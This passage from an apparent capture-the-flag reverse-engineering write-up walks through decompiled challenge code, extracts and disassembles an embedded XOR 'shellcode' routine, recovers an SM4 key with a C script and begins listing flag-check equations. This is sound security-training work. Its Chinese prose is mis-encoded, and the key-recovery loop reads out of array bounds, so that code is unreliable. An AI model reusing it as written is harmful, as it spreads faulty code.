</span></span><span class=line><span class=cl>    <span class=nx>sub_402AD3</span><span class=p>(</span><span class=nx>v45</span><span class=p>,</span> <span class=p>(</span><span class=nx>__int64</span><span class=p>)</span><span class=nx>v33</span><span class=p>,</span> <span class=p>(</span><span class=nx>__int64</span><span class=p>)</span><span class=nx>v33</span><span class=p>,</span> <span class=nx>v11</span><span class=p>,</span> <span class=nx>v12</span><span class=p>,</span> <span class=nx>v13</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>sub_402AD3</span><span class=p>(</span><span class=nx>v44</span><span class=p>,</span> <span class=p>(</span><span class=nx>__int64</span><span class=p>)</span><span class=o>&amp;</span><span class=nx>v30</span><span class=p>,</span> <span class=p>(</span><span class=nx>__int64</span><span class=p>)</span><span class=o>&amp;</span><span class=nx>v30</span><span class=p>,</span> <span class=nx>v14</span><span class=p>,</span> <span class=nx>v15</span><span class=p>,</span> <span class=nx>v16</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>sub_402B16</span><span class=p>(</span><span class=nx>v44</span><span class=p>,</span> <span class=nx>v41</span><span class=p>,</span> <span class=nx>v25</span><span class=p>,</span> <span class=mi>6</span><span class=nx>LL</span><span class=p>,</span> <span class=o>&amp;</span><span class=nx>v30</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>v39</span> <span class=o>=</span> <span class=nx>v32</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nx>sub_402729</span><span class=p>(</span><span class=nx>v44</span><span class=p>,</span> <span class=p>(</span><span class=nx>__int64</span><span class=p>)</span><span class=nx>v28</span><span class=p>,</span> <span class=nx>v32</span><span class=p>,</span> <span class=mi>87</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>sub_402729</span><span class=p>(</span><span class=nx>v44</span><span class=p>,</span> <span class=p>(</span><span class=nx>__int64</span><span class=p>)</span><span class=nx>SM4_Key</span><span class=p>,</span> <span class=nx>v39</span> <span class=o>+</span> <span class=mi>256</span><span class=p>,</span> <span class=mi>16</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>v36</span> <span class=o>=</span> <span class=nx>v39</span> <span class=o>+</span> <span class=mi>256</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nx>sub_402B16</span><span class=p>(</span><span class=nx>v44</span><span class=p>,</span> <span class=nx>v39</span><span class=p>,</span> <span class=o>&amp;</span><span class=nx>v36</span><span class=p>,</span> <span class=mi>1</span><span class=nx>LL</span><span class=p>,</span> <span class=o>&amp;</span><span class=nx>v30</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>sub_40262A</span><span class=p>(</span><span class=nx>v44</span><span class=p>,</span> <span class=p>(</span><span class=nx>__int64</span><span class=p>)</span><span class=nx>SM4_Key</span><span class=p>,</span> <span class=nx>v32</span> <span class=o>-</span> <span class=mi>1</span><span class=p>,</span> <span class=mi>17</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>sub_402729</span><span class=p>(</span><span class=nx>v44</span><span class=p>,</span> <span class=p>(</span><span class=nx>__int64</span><span class=p>)</span><span class=nx>SM4_Key</span><span class=p>,</span> <span class=p>(</span><span class=nx>__int64</span><span class=p>)</span><span class=nx>SM4_Key</span><span class=p>,</span> <span class=mi>17</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>v34</span> <span class=o>=</span> <span class=o>-</span><span class=mi>23</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nx>v35</span> <span class=o>=</span> <span class=nx>sub_40320C</span><span class=p>(</span><span class=nx>v40</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>sub_402729</span><span class=p>(</span><span class=nx>v44</span><span class=p>,</span> <span class=p>(</span><span class=nx>__int64</span><span class=p>)</span><span class=o>&amp;</span><span class=nx>v34</span><span class=p>,</span> <span class=nx>v40</span><span class=p>,</span> <span class=mi>5</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>sub_402A90</span><span class=p>(</span><span class=nx>v44</span><span class=p>,</span> <span class=p>(</span><span class=nx>__int64</span><span class=p>)</span><span class=nx>v33</span><span class=p>,</span> <span class=p>(</span><span class=nx>__int64</span><span class=p>)</span><span class=nx>v33</span><span class=p>,</span> <span class=nx>v17</span><span class=p>,</span> <span class=nx>v18</span><span class=p>,</span> <span class=nx>v19</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>sub_402A1B</span><span class=p>(</span><span class=nx>v44</span><span class=p>,</span> <span class=p>(</span><span class=nx>__int64</span><span class=p>)</span><span class=nx>v33</span><span class=p>,</span> <span class=nx>v20</span><span class=p>,</span> <span class=nx>v21</span><span class=p>,</span> <span class=nx>v22</span><span class=p>,</span> <span class=nx>v23</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>sub_406C80</span><span class=p>(</span><span class=nx>v45</span><span class=p>,</span> <span class=mi>18</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>sub_435B80</span><span class=p>(</span><span class=nx>v45</span><span class=p>,</span> <span class=mi>0</span><span class=nx>LL</span><span class=p>,</span> <span class=mi>0</span><span class=nx>LL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>sub_4071A0</span><span class=p>(</span><span class=mi>0</span><span class=nx>LL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>å†™ä¸ªè„šæœ¬æå‡ºæ¥shellcode</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-JavaScript data-lang=JavaScript><span class=line><span class=cl><span class=nx>shellcode_chunks</span> <span class=o>=</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>    <span class=mh>0xE87D8948E5894855</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=mh>0xEB0000000FFC45C7</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=mh>0x48D06348FC458B3A</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=mh>0xB60FD00148E8458B</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=mh>0x8D489848FC458B30</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=mh>0x148E8458B48FF50</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=mh>0x48FC458B08B60FD0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=mh>0x148E8458B48D063</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=mh>0x831088F289CE31D0</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=mh>0x7F00FC7D8301FC6D</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=mh>0xC35D9090C07F</span>
</span></span><span class=line><span class=cl><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>with</span> <span class=nx>open</span><span class=p>(</span><span class=s2>&#34;shellcode.bin&#34;</span><span class=p>,</span> <span class=s2>&#34;wb&#34;</span><span class=p>)</span> <span class=nx>as</span> <span class=nx>f</span><span class=o>:</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=nx>chunk</span> <span class=k>in</span> <span class=nx>shellcode_chunks</span><span class=o>:</span>
</span></span><span class=line><span class=cl>        <span class=nx>f</span><span class=p>.</span><span class=nx>write</span><span class=p>(</span><span class=nx>chunk</span><span class=p>.</span><span class=nx>to_bytes</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=nx>byteorder</span><span class=o>=</span><span class=s1>&#39;little&#39;</span><span class=p>))</span>
</span></span></code></pre></td></tr></table></div></div><p>idaåæ±‡ç¼–å¾—åˆ°</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-JavaScript data-lang=JavaScript><span class=line><span class=cl>                                        <span class=nx>push</span>    <span class=nx>rbp</span>
</span></span><span class=line><span class=cl><span class=nx>seg000</span><span class=o>:</span><span class=mi>0000000000000001</span>                 <span class=nx>mov</span>     <span class=nx>rbp</span><span class=p>,</span> <span class=nx>rsp</span>
</span></span><span class=line><span class=cl><span class=nx>seg000</span><span class=o>:</span><span class=mi>0000000000000004</span>                 <span class=nx>mov</span>     <span class=p>[</span><span class=nx>rbp</span><span class=o>+</span><span class=nx>var_18</span><span class=p>],</span> <span class=nx>rdi</span>
</span></span><span class=line><span class=cl><span class=nx>seg000</span><span class=o>:</span><span class=mi>0000000000000008</span>                 <span class=nx>mov</span>     <span class=p>[</span><span class=nx>rbp</span><span class=o>+</span><span class=nx>var_4</span><span class=p>],</span> <span class=mi>0</span><span class=nx>Fh</span>
</span></span><span class=line><span class=cl><span class=nx>seg000</span><span class=o>:</span><span class=mi>000000000000000</span><span class=nx>F</span>                 <span class=nx>jmp</span>     <span class=kr>short</span> <span class=nx>loc_4B</span>
</span></span><span class=line><span class=cl><span class=nx>seg000</span><span class=o>:</span><span class=mi>0000000000000011</span> <span class=p>;</span> <span class=o>---------------------------------------------------------------------------</span>
</span></span><span class=line><span class=cl><span class=nx>seg000</span><span class=o>:</span><span class=mi>0000000000000011</span>                 <span class=nx>mov</span>     <span class=nx>eax</span><span class=p>,</span> <span class=p>[</span><span class=nx>rbp</span><span class=o>+</span><span class=nx>var_4</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=nx>seg000</span><span class=o>:</span><span class=mi>0000000000000014</span>                 <span class=nx>movsxd</span>  <span class=nx>rdx</span><span class=p>,</span> <span class=nx>eax</span>
</span></span><span class=line><span class=cl><span class=nx>seg000</span><span class=o>:</span><span class=mi>0000000000000017</span>                 <span class=nx>mov</span>     <span class=nx>rax</span><span class=p>,</span> <span class=p>[</span><span class=nx>rbp</span><span class=o>+</span><span class=nx>var_18</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=nx>seg000</span><span class=o>:</span><span class=mi>000000000000001</span><span class=nx>B</span>                 <span class=nx>add</span>     <span class=nx>rax</span><span class=p>,</span> <span class=nx>rdx</span>
</span></span><span class=line><span class=cl><span class=nx>seg000</span><span class=o>:</span><span class=mi>000000000000001</span><span class=nx>E</span>                 <span class=nx>movzx</span>   <span class=nx>esi</span><span class=p>,</span> <span class=kr>byte</span> <span class=nx>ptr</span> <span class=p>[</span><span class=nx>rax</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=nx>seg000</span><span class=o>:</span><span class=mi>0000000000000021</span>                 <span class=nx>mov</span>     <span class=nx>eax</span><span class=p>,</span> <span class=p>[</span><span class=nx>rbp</span><span class=o>+</span><span class=nx>var_4</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=nx>seg000</span><span class=o>:</span><span class=mi>0000000000000024</span>                 <span class=nx>cdqe</span>
</span></span><span class=line><span class=cl><span class=nx>seg000</span><span class=o>:</span><span class=mi>0000000000000026</span>                 <span class=nx>lea</span>     <span class=nx>rdx</span><span class=p>,</span> <span class=p>[</span><span class=nx>rax</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=nx>seg000</span><span class=o>:</span><span class=mi>000000000000002</span><span class=nx>A</span>                 <span class=nx>mov</span>     <span class=nx>rax</span><span class=p>,</span> <span class=p>[</span><span class=nx>rbp</span><span class=o>+</span><span class=nx>var_18</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=nx>seg000</span><span class=o>:</span><span class=mi>000000000000002</span><span class=nx>E</span>                 <span class=nx>add</span>     <span class=nx>rax</span><span class=p>,</span> <span class=nx>rdx</span>
</span></span><span class=line><span class=cl><span class=nx>seg000</span><span class=o>:</span><span class=mi>0000000000000031</span>                 <span class=nx>movzx</span>   <span class=nx>ecx</span><span class=p>,</span> <span class=kr>byte</span> <span class=nx>ptr</span> <span class=p>[</span><span class=nx>rax</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=nx>seg000</span><span class=o>:</span><span class=mi>0000000000000034</span>                 <span class=nx>mov</span>     <span class=nx>eax</span><span class=p>,</span> <span class=p>[</span><span class=nx>rbp</span><span class=o>+</span><span class=nx>var_4</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=nx>seg000</span><span class=o>:</span><span class=mi>0000000000000037</span>                 <span class=nx>movsxd</span>  <span class=nx>rdx</span><span class=p>,</span> <span class=nx>eax</span>
</span></span><span class=line><span class=cl><span class=nx>seg000</span><span class=o>:</span><span class=mi>000000000000003</span><span class=nx>A</span>                 <span class=nx>mov</span>     <span class=nx>rax</span><span class=p>,</span> <span class=p>[</span><span class=nx>rbp</span><span class=o>+</span><span class=nx>var_18</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=nx>seg000</span><span class=o>:</span><span class=mi>000000000000003</span><span class=nx>E</span>                 <span class=nx>add</span>     <span class=nx>rax</span><span class=p>,</span> <span class=nx>rdx</span>
</span></span><span class=line><span class=cl><span class=nx>seg000</span><span class=o>:</span><span class=mi>0000000000000041</span>                 <span class=nx>xor</span>     <span class=nx>esi</span><span class=p>,</span> <span class=nx>ecx</span>
</span></span><span class=line><span class=cl><span class=nx>seg000</span><span class=o>:</span><span class=mi>0000000000000043</span>                 <span class=nx>mov</span>     <span class=nx>edx</span><span class=p>,</span> <span class=nx>esi</span>
</span></span><span class=line><span class=cl><span class=nx>seg000</span><span class=o>:</span><span class=mi>0000000000000045</span>                 <span class=nx>mov</span>     <span class=p>[</span><span class=nx>rax</span><span class=p>],</span> <span class=nx>dl</span>
</span></span><span class=line><span class=cl><span class=nx>seg000</span><span class=o>:</span><span class=mi>0000000000000047</span>                 <span class=nx>sub</span>     <span class=p>[</span><span class=nx>rbp</span><span class=o>+</span><span class=nx>var_4</span><span class=p>],</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl><span class=nx>seg000</span><span class=o>:</span><span class=mi>000000000000004</span><span class=nx>B</span>
</span></span><span class=line><span class=cl><span class=nx>seg000</span><span class=o>:</span><span class=mi>000000000000004</span><span class=nx>B</span> <span class=nx>loc_4B</span><span class=o>:</span>                                 <span class=p>;</span> <span class=nx>CODE</span> <span class=nx>XREF</span><span class=o>:</span> <span class=nx>sub_0</span><span class=o>+</span><span class=nx>F</span><span class=err>â†‘</span><span class=nx>j</span>
</span></span><span class=line><span class=cl><span class=nx>seg000</span><span class=o>:</span><span class=mi>000000000000004</span><span class=nx>B</span>                 <span class=nx>cmp</span>     <span class=p>[</span><span class=nx>rbp</span><span class=o>+</span><span class=nx>var_4</span><span class=p>],</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=nx>seg000</span><span class=o>:</span><span class=mi>000000000000004</span><span class=nx>F</span>                 <span class=nx>jg</span>      <span class=kr>short</span> <span class=nx>near</span> <span class=nx>ptr</span> <span class=mi>0</span><span class=nx>D0h</span>
</span></span><span class=line><span class=cl><span class=nx>seg000</span><span class=o>:</span><span class=mi>0000000000000051</span>                 <span class=nx>rcl</span>     <span class=kr>byte</span> <span class=nx>ptr</span> <span class=p>[</span><span class=nx>rax</span><span class=o>+</span><span class=mi>0</span><span class=nx>C35D90h</span><span class=p>],</span> <span class=mi>0</span>
</span></span></code></pre></td></tr></table></div></div><p>å¾ˆæ˜æ˜¾çš„å¾ªç¯å¼‚æˆ–é€»è¾‘ï¼Œä»æœ€åä¸€ä½ä¸€ç›´å‘å‰å¼‚æˆ–ï¼Œå†™ä¸ªè„šæœ¬æ¨¡æ‹Ÿä¸€ä¸‹å¾—åˆ°çœŸæ­£çš„key</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-C++ data-lang=C++><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span> 
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>unsigned</span> <span class=kt>char</span> <span class=n>a</span><span class=p>[</span><span class=mi>16</span><span class=p>]</span> <span class=o>=</span> 
</span></span><span class=line><span class=cl>        <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=mh>0x39</span><span class=p>,</span> <span class=mh>0x5A</span><span class=p>,</span> <span class=mh>0x3B</span><span class=p>,</span> <span class=mh>0x5D</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mh>0x3C</span><span class=p>,</span> <span class=mh>0x0A</span><span class=p>,</span> <span class=mh>0x3E</span><span class=p>,</span> <span class=mh>0x08</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mh>0x3E</span><span class=p>,</span> <span class=mh>0x5F</span><span class=p>,</span> <span class=mh>0x6F</span><span class=p>,</span> <span class=mh>0x5D</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mh>0x65</span><span class=p>,</span> <span class=mh>0x07</span><span class=p>,</span> <span class=mh>0x61</span><span class=p>,</span> <span class=mh>0x03</span>
</span></span><span class=line><span class=cl>    <span class=p>};</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=kt>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>16</span><span class=p>;</span> <span class=n>i</span> <span class=o>&gt;=</span><span class=mi>0</span><span class=p>;</span> <span class=n>i</span><span class=o>--</span><span class=p>)</span> 
</span></span><span class=line><span class=cl>        <span class=n>a</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>^=</span> <span class=n>a</span><span class=p>[</span><span class=n>i</span> <span class=o>-</span> <span class=mi>1</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=kt>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mi>16</span><span class=p>;</span> <span class=o>++</span><span class=n>i</span><span class=p>)</span> 
</span></span><span class=line><span class=cl>        <span class=n>printf</span><span class=p>(</span><span class=s>&#34;%.2X&#34;</span><span class=p>,</span><span class=n>a</span><span class=p>[</span><span class=n>i</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=n>printf</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>è§£å®Œå¾—åˆ°39 63 61 66 61 36 34 36 36 61 30 32 38 62 66 62</p><p>ç„¶åèµ›åšå¨å­è§£å¾—å‡flag</p><p><img src=/img/2025-DASCTF%E4%B8%8A%E5%8D%8A%E5%B9%B4/6b02f1ab-2046-415d-907b-1c4bfa227df5.png alt=img></p><p>ç„¶åå¡ä½äº†æŒºé•¿æ—¶é—´çš„ï¼ŒçŒœæƒ³é€šè¿‡ptraceæ”¹äº†å¯†æ–‡ï¼Œç¿»é˜…å‡½æ•°çœ‹åˆ°äº†æ–¹ç¨‹ç»„</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=n>BOOL8</span> <span class=kr>__fastcall</span> <span class=nf>sub_4019A5</span><span class=p>(</span><span class=kt>unsigned</span> <span class=kr>__int8</span> <span class=o>*</span><span class=n>a1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=mi>118</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span> <span class=o>+</span> <span class=mi>173</span> <span class=o>*</span> <span class=o>*</span><span class=n>a1</span> <span class=o>+</span> <span class=mi>48</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>+</span> <span class=mi>193</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span> <span class=o>!=</span> <span class=mi>66131</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>1LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=mi>196</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>+</span> <span class=mi>68</span> <span class=o>*</span> <span class=o>*</span><span class=n>a1</span> <span class=o>+</span> <span class=mi>104</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span> <span class=o>+</span> <span class=mi>10</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span> <span class=o>!=</span> <span class=mi>52620</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>1LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=mi>88</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span> <span class=o>+</span> <span class=mi>22</span> <span class=o>*</span> <span class=o>*</span><span class=n>a1</span> <span class=o>+</span> <span class=mi>37</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>+</span> <span class=mi>71</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span> <span class=o>!=</span> <span class=mi>36011</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>1LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=mi>59</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span> <span class=o>+</span> <span class=mi>141</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>+</span> <span class=mi>89</span> <span class=o>*</span> <span class=o>*</span><span class=n>a1</span> <span class=o>+</span> <span class=mi>194</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span> <span class=o>!=</span> <span class=mi>61842</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>1LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=mi>175</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>6</span><span class=p>]</span> <span class=o>+</span> <span class=mi>88</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>5</span><span class=p>]</span> <span class=o>+</span> <span class=mi>40</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>4</span><span class=p>]</span> <span class=o>+</span> <span class=mi>89</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>7</span><span class=p>]</span> <span class=o>!=</span> <span class=mi>65258</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>1LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=mi>26</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>6</span><span class=p>]</span> <span class=o>+</span> <span class=mi>166</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>5</span><span class=p>]</span> <span class=o>+</span> <span class=mi>82</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>4</span><span class=p>]</span> <span class=o>+</span> <span class=mi>78</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>7</span><span class=p>]</span> <span class=o>!=</span> <span class=mi>58176</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>1LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=mi>149</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>6</span><span class=p>]</span> <span class=o>+</span> <span class=mi>73</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>4</span><span class=p>]</span> <span class=o>+</span> <span class=mi>10</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>5</span><span class=p>]</span> <span class=o>+</span> <span class=mi>116</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>7</span><span class=p>]</span> <span class=o>!=</span> <span class=mi>62478</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>1LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=mi>176</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>6</span><span class=p>]</span> <span class=o>+</span> <span class=mi>198</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>4</span><span class=p>]</span> <span class=o>+</span> <span class=mi>80</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>5</span><span class=p>]</span> <span class=o>+</span> <span class=mi>193</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>7</span><span class=p>]</span> <span class=o>!=</span> <span class=mi>114069</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>1LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=mi>178</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>10</span><span class=p>]</span> <span class=o>+</span> <span class=mi>100</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>9</span><span class=p>]</span> <span class=o>+</span> <span class=mi>83</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>8</span><span class=p>]</span> <span class=o>+</span> <span class=mi>30</span> <span class=o>*</span> <span class=n>a1</span><span class=p>[</span><span class=mi>11</span><span class=p>]</span> <span class=o>!=</span> <span class=mi>56170</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>1LL</span><span class=p>;</span>
